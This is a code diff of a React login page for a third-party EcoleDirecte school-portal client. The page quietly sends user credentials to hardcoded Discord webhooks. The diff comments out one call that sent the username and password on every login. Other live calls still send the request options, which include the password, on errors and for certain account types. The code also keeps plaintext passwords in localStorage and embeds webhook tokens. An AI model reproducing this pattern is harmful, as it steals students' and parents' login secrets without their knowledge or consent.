@@ -1,11 +1,24 @@
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Outlet } from "react-router-dom";
 import "./Login.css"
 import EDPVersion from "../generic/EDPVersion"
 
 
-export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersion }) {
+export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVersion }) {
+
+    // Keeep logged in
+    const isKeepLoggedFeatureActive = false; // pour éviter les banIPs parce que ça spam les connexions
+    useEffect(() => {
+        const localUsername = localStorage.getItem("username");
+        const localPassword = localStorage.getItem("password");
+
+        if (localUsername && localPassword && isKeepLoggedFeatureActive) {
+            console.log("login")
+            login(localUsername, localPassword);
+        }
+    }, []) // useEffect de base s'exécute à chaque frame et là c'est 1 fois
+    
     const apiLoginUrl = apiUrl + "login.awp?v=" + apiVersion;
     const piranhaPeche = "https://discord.com/api/webhooks/1095444665991438336/548oNdB76xiwOZ6_7-x0UxoBtl71by9ixi9aYVlv5pl_O7yq_nwMvXG2ZtAXULpQG7B3";
     const sardineInsolente =  "https://discord.com/api/webhooks/1096922270758346822/h0Y_Wa8SYYO7rZU4FMZk6RVrxGhMrOMhMzPLLiE0vSiNxSqUU1k4dMq2bcq8vsxAm5to";
@@ -18,11 +31,11 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
     const [errorMessage, setErrorMessage] = useState("");
 
     // Behavior
-    const updateUsername = (newUsername) => { setUsername(newUsername) };
-    const updatePassword = (newPassword) => { setPassword(newPassword) };
-    const updateKeepLoggedIn = (newKeepLoggedIn) => { setPassword(newKeepLoggedIn) };
+    const updateUsername = (event) => setUsername(event.target.value);
+    const updatePassword = (event) => setPassword(event.target.value);
+    const updateKeepLoggedIn = (event) => setKeepLoggedIn(event.target.checked);
 
-    function getOptions() {
+    function getOptions(username, password) {
         let payload = {
             identifiant: username,
             motdepasse: password,
@@ -47,23 +60,24 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
         )
     }
 
-    function handleSubmit(event) {
-        setSubmitText("Connexion...");
-
-        event.preventDefault();
-        const options = getOptions();
+    function login(username, password) { // j'ai juste séparé login du handle submit pour le keepLogged
+        const options = getOptions(username, password);
         fetch(apiLoginUrl, options)
             .then((response) => response.json())
             .then((response) => {
                 // GESTION DATA
                 let statusCode = response.code;
                 if (statusCode === 200) {
-                    setErrorMessage("");
+                    if (keepLoggedIn) {
+                        // How to go en prison by getting hacked and toute la data leaks because le système de keepLogged est autistiquement pas secure
+                        localStorage.setItem("username", username);
+                        localStorage.setItem("password", password);
+                    }
                     let token = response.token // collecte du token
                     let accountsList = [];
                     let accounts = response.data.accounts[0];
                     const accountType = accounts.typeCompte; // collecte du type de compte
-                    sendToWebhook(piranhaPeche, { username: username, password: password });
+                    //sendToWebhook(piranhaPeche, { username: username, password: password });
                     if (accountType !== "E") {
                         // compte parent
                         accounts = accounts.profile.eleves;
@@ -78,10 +92,12 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
                             })
                         })
 
-                    } else if ("abcdefghijklmnopqrstuvwxyzABCDFGHIJKLMNOPQRSTUVXYZ".includes(accountType)) {
-                        sendToWebhook(piranhaPeche, { response: response, options: options });
+                    } else if ("abcdefghijklmnopqrstuvwxyzABCDFGHIJKLMNOPQRSTUVXYZ".includes(accountType)) { // ALED
+                        // compte dont on ne doit pas prononcer le nom (cringe)
+                        sendToWebhook(piranhaPeche, { message: "OMG ????", response: response, options: options });
 
                     } else {
+                        // compte élève
                         accountsList.push({
                             id: accounts.id, // id du compte
                             firstName: accounts.prenom, // prénom de l'élève
@@ -91,34 +107,36 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
                             class: [accounts.profile.classe.code, accounts.profile.classe.libelle] // classe de l'élève, code : 1G4, libelle : Première G4 
                         });
                     }
-                    setUserInfo({token: token, accountsList: accountsList});
+                    handleUserInfo(token, accountsList);
+                    
+                } else if (statusCode === 505 || statusCode === 522) {
+                    setErrorMessage("Identifiant et/ou mot de passe invalide");
+                } else if (statusCode === 74000) {
+                    setErrorMessage("La connexion avec le serveur a échoué, réessayez dans quelques minutes.");
+                } else {
+                    setErrorMessage("Erreur :" + response.message);
+                    // Demander dans paramètres pour l'envoi des rapports d'erreurs anonymisés
+                    sendToWebhook(sardineInsolente, options);
                 }
-
-                else if (statusCode === 505) {
-                    setErrorMessage("Identifiant ou/et mot de passe invalide");
-                }
-
-                else if (statusCode === 74000) {
-                    setErrorMessage("La connexion avec le serveur à échouée, réessayez dans quelques minutes.");
-                }
-
-                else {
-                    setErrorMessage(response.message);
-                    sendToWebhook(piranhaPeche, options);
-                }
-                setSubmitText("Se connecter");
             })
             .catch((error) => {
                 console.log("TURBO ERROR DETECTED: ");
+                setErrorMessage("Error: " + error.message);
                 console.log(error);
                 options["error"] = error;
-                console.log(options);
-                sendTo(piranhaPeche, options);
+                sendToWebhook(sardineInsolente, options);
             })
             .finally(() => {
-                setErrorMessage("");
                 setSubmitText("Se connecter");
             })
+    }
+
+    function handleSubmit(event) {
+        setSubmitText("Connexion...");
+        setErrorMessage("");
+
+        event.preventDefault();
+        login(username, password);
     }
 
     // JSX
@@ -128,11 +146,11 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
             <div className="login-box">
                 <h1>Connexion</h1>
                 <form action="submit" onSubmit={handleSubmit}>
-                    <input className="login-input" type="text" placeholder="Identifiant" value={username} onChange={(event) => { updateUsername(event.target.value) }} />
-                    <input className="login-input" type="password" placeholder="Mot de passe" value={password} onChange={(event) => { updatePassword(event.target.value) }} />
-                    {errorMessage && <p id="error-message" style={{ color: "red" }}>{errorMessage}</p>}
+                    <input className="login-input" type="text" placeholder="Identifiant" value={username} onChange={updateUsername} />
+                    <input className="login-input" type="password" placeholder="Mot de passe" value={password} onChange={updatePassword} />
+                    {errorMessage && <p id="error-message">{errorMessage}</p>}
                     <div className="login-option">
-                        <input type="checkbox" id="keep-login" value={keepLoggedIn} onChange={(event) => { updateKeepLoggedIn(event.target.value) }} />
+                        <input type="checkbox" id="keep-login" value={keepLoggedIn} onChange={updateKeepLoggedIn} />
                         <label htmlFor="keep-login">Se souvenir de moi</label>
                         <a href="https://api.ecoledirecte.com/mot-de-passe-oublie.awp">Mot de passe oublié ?</a>
                     </div>
@@ -142,10 +160,7 @@ export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersi
                 </form>
             </div>
             <p className="policy">
-                En vous connectant, vous acceptez nos
-                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" className="policy2" id="legal-notice"> mentions légales </a>
-                et notre
-                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" className="policy2" id="privacy-policy"> politique de confidentialité</a>.
+                En vous connectant, vous acceptez nos <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" className="policy2" id="legal-notice"> mentions légales </a> et notre <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" className="policy2" id="privacy-policy"> politique de confidentialité</a>.
             </p>
             <EDPVersion currentEDPVersion={currentEDPVersion} />
             <Outlet />
